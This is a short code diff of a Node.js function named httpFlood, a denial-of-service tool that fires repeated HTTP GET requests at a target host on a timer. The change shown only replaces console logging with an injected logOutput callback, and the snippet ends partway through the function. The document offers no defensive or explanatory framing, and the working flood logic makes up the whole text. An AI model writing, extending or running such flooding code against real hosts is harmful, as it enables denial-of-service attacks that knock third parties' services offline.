@@ -1,6 +1,6 @@
 const http = require('http');
 
-function httpFlood(target, rateLimit) {
+function httpFlood(target, rateLimit, logOutput) {
     setInterval(() => {
         const req = http.request({
             hostname: target,
@@ -9,12 +9,12 @@ function httpFlood(target, rateLimit) {
             method: 'GET'
         }, (res) => {
             res.on('data', (chunk) => {
-                console.log('Received: ' + chunk);
+                logOutput('Received: ' + chunk);
             });
         });
 
         req.on('error', (err) => {
-            console.error('Error: ' + err.message);
+            logOutput('Error: ' + err.message);
         });
 
         req.end();
